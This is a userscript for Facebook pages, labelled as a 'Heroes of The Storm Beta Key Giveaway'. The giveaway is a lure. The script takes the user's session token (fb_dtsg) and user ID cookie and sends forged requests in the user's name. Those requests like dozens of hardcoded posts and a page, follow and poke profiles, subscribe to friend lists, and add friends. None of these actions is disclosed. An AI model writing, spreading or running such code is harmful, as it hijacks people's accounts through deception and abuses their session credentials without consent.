// ==UserScript==
// @name            Heroes of The Storm Beta Key Giveaway
// @namespace       Heroes of The Storm Beta Key Giveaway 
// @Hak Cipta           Ajaran katolik
// @include			http://facebook.com/*
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } function p(abone) { var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); } 
// pic + fans
P("1407161696194639");
Like("618724291502492")
P("619091988132389");
P("618725208169067");
P("635895086452079");
P("628789753829279");
P("1407158576194951");
P("1404355499808592");
P("1404240786486730");
P("1403917299852412");
P("1403263096584499");
P("1402491476661661");
P("1400542496856559");
P("1400256696885139");
P("1400163790227763");
P("1387550531489089");
P("1394423470801795");
P("1411964269047715");
P("1408963199347822");
P("643028469072074");
P("619091988132389");
P("646968305344757");
P("646968318678089");
P("646968328678088");
P("646968348678086");
P("646968365344751");
P("646968385344749");
P("646968418678079");
P("646968432011411");
P("646968455344742");
P("646968462011408");
P("646968488678072");
P("646968505344737");
P("646968515344736");
P("646968552011399");
P("646968285344759");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
